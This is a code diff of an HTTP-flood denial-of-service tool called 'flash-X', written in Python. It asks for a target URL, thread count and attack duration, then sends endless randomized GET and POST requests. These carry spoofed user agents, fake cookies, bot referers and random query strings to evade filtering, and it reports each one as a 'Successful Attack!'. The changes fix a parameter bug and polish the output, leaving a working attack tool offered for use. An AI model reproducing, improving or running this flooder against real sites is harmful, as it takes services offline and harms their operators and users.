@@ -14,16 +14,15 @@ from fake_useragent import UserAgent
 from halo import Halo
 import cfonts
 
-# إ
+
 os.system('clear')
 
-# 
+
 with open("info.json", "r") as f:
     data = json.load(f)
     version = data["version"]
     author = data["author"]
 
-# logo App
 logo = cfonts.render(
     text="flash-X",
     colors=["white", "cyan"],
@@ -38,13 +37,13 @@ Method  : {F.CYAN}HTTP{F.RESET}.
 """)
 print('-' * 60)
 
-# إعداد المكتبات
+#
 fake = faker.Faker()
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 ua = UserAgent()
 
 def build_cookies() -> Dict[str, str]:
-    """Create Cookies """
+    """Create Cookies."""
     cookies = {}
     key = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 10)))
     value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 15)))
@@ -52,22 +51,19 @@ def build_cookies() -> Dict[str, str]:
     return cookies
 
 def build_block(size: int) -> str:
-    
+
     return ''.join(chr(random.randint(65, 90)) for _ in range(size))
 
 def referer_bot() -> str:
     
     with open("tools/bot.txt", "r") as b:
-        bots = b.readlines()
-        random_bot = random.choice(bots).strip()
+        bot = b.readlines()
+        random_bot = random.choice(bot).strip()
         block = build_block(random.randint(3, 15))
     return random_bot + block
 
-
-botRef = referer_bot()
-
 def generate_headers() -> Dict[str, str]:
-    """ headers HTTP."""
+   
     return {
         "User-Agent": ua.random,
         "X-Requested-With": "XMLHttpRequest",
@@ -77,7 +73,7 @@ def generate_headers() -> Dict[str, str]:
         "Accept-Encoding": "gzip, deflate, br",
         "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
         "Accept-Language": "en-US,en;q=0.9",
-        "Referer": botRef,
+        "Referer": referer_bot(),
         "DNT": "1",
         "Upgrade-Insecure-Requests": "1",
         "Connection": "keep-alive",
@@ -86,13 +82,13 @@ def generate_headers() -> Dict[str, str]:
     }
 
 def generate_rand_data() -> Dict[str, str]:
-    
+   
     return {
         "q": build_block(size=random.randint(3, 10)) + "=" + build_block(size=random.randint(3, 10)),
     }
 
 def flood(target: str) -> None:
-   
+    """  Start attack  """
     while True:
         try:
             type_request = random.choice(["GET", "POST"])
@@ -100,15 +96,12 @@ def flood(target: str) -> None:
             params = generate_rand_data()
 
             if type_request == "GET":
-                response = requests.get(target, headers=headers, params=paramsGet, timeout=5)
+                response = requests.get(target, headers=headers, params=params, timeout=5)
             else:
                 response = requests.post(target, headers=headers, timeout=5)
-            
-            colorF_G = f"{F.GREEN if response.status_code == 200 else F.RED}"
-            status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
-            payload_size = f"{colorF_G} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
-            request_info = f"{F.CYAN}{type_request}{F.RESET}"
-            print(f"{status}:{request_info} Successful Attack! --> {payload_size} {F.RESET}{F.RESET}")
+
+            status_color = F.GREEN if response.status_code == 200 else F.RED
+            print(f"{status_color}({response.status_code}) {F.CYAN}{type_request}{F.RESET} Successful Attack!{F.RESET}")
 
         except requests.exceptions.RequestException:
             print(f"{F.RED}( !!! ) {F.RESET}Request Failed...")
@@ -127,14 +120,16 @@ def start_flooding(target: str, thread_count: int, duration: int, time_sleep: in
     print(f"\n{F.CYAN}( Done ) {F.GREEN}Attack finished after {F.RED}{duration} seconds.{F.RESET}")
 
 if __name__ == "__main__":
-    # إدخال معلومات الهجوم
-    target_url = input(f'\n{F.RESET}┌─({F.CYAN}flashX{F.RESET})─({F.YELLOW}~ TARGET URL{F.RESET})\n└──{F.YELLOW}~: {F.CYAN}')
-    num_threads = int(input(f'\n{F.RESET}┌─({F.CYAN}flashX{F.RESET})─({F.YELLOW}~ THREADS{F.RESET})\n└──{F.YELLOW}~: {F.CYAN}'))
-    duration = int(input(f'\n{F.RESET}┌─({F.CYAN}flashX{F.RESET})─({F.YELLOW}~ TIME ATTACK{F.RESET})\n└──{F.YELLOW}~: {F.CYAN}'))
-    time_sleep = int(input(f'\n{F.RESET}┌─({F.CYAN}flashX{F.RESET})─({F.YELLOW}~ TIME SLEEP{F.RESET})\n└──{F.YELLOW}~: {F.CYAN}'))
+
+
+    target_url = input(f'\n{F.CYAN}┌─({F.GREEN}flashX{F.CYAN})─({F.YELLOW}~ TARGET URL{F.CYAN})\n└──{F.YELLOW}~: {F.GREEN}')
+    num_threads = int(input(f'\n{F.CYAN}┌─({F.GREEN}flashX{F.CYAN})─({F.YELLOW}~ THREADS{F.CYAN})\n└──{F.YELLOW}~: {F.GREEN}'))
+    duration = int(input(f'\n{F.CYAN}┌─({F.GREEN}flashX{F.CYAN})─({F.YELLOW}~ TIME ATTACK{F.CYAN})\n└──{F.YELLOW}~: {F.GREEN}'))
+    time_sleep = int(input(f'\n{F.CYAN}┌─({F.GREEN}flashX{F.CYAN})─({F.YELLOW}~ TIME SLEEP{F.CYAN})\n└──{F.YELLOW}~: {F.GREEN}'))
 
     print(f"""
-- {F.RESET} Attack On {F.CYAN}{target_url}{F.RESET} For {F.CYAN}{duration}{F.RESET} Using {F.CYAN}{num_threads} Threads.
+- {F.GREEN} Attack On : {F.RED}{target_url}{F.RESET}
+- {F.GREEN}Time Attack: {F.RED}{duration}{F.RESET}
 -----------------------------------------------------------
 """)
     spinner = Halo(text="Loading ...", spinner="dots")
